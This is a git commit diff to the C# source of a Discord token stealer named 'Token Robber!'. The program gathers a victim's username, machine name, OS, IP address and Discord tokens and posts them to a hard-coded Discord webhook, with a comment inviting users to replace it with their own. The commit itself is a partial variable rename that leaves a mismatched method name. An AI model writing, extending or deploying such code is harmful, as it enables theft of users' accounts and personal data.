dcc722d1ab60c06f73256114439df20cad84aa8d
EbicHecker <sxpremecrypt@pm.me>
2021-12-07 23:04:04 +0100

    Update Program.cs

--- Program.cs
+++ Program.cs
@@ -6,24 +6,24 @@ public static class Program
 {
     private static async Task Main()
     {
-        StringBuilder content = new StringBuilder()
+        StringBuilder sb = new StringBuilder()
             .AppendLine($"Username: {Environment.UserName}")
             .AppendLine($"Machine Name: {Environment.MachineName}")
             .AppendLine($"Operating System: {Environment.OSVersion.Platform}")
             .AppendLine($"IP-Adress: {await IPInfo.GetAddress()}")
             .AppendLine("Tokens: ");
-        await Parallel.ForEachAsync(TokenParser.ParseAll(), async (token, cts) => await AppendSummaryIfValid(token, content, cts));
+        await Parallel.ForEachAsync(TokenParser.ParseAll(), async (token, cts) => await AppendUserSummary(token, sb, cts));
         using DiscordWebhook webhook = new DiscordWebhook("913528883410771989", "bpci971IJ8tSAvn0iPqiJ2HioRhy5RD_6syK-Avg4iqTTQa7pGMvxLMvOXNIyvxEJi3C"); // Replace with your own.
-        await webhook.SendMessage(new DiscordMessage(content.ToString(), "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256"));
+        await webhook.SendMessage(new DiscordMessage(sb.ToString(), "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256"));
     }
 
-    private static async Task AppendSummaryIfValid(string token, StringBuilder content, CancellationToken cts)
+    private static async Task AppendSummaryIfValid(string token, StringBuilder sb, CancellationToken cts)
     {
         DiscordClient client = new DiscordClient(token);
         string? summary = await client.GetSummary(cts);
-        lock (content)
+        lock (sb)
         {
-            content.Append(summary);
+            sb.Append(summary);
         }
     }
 }
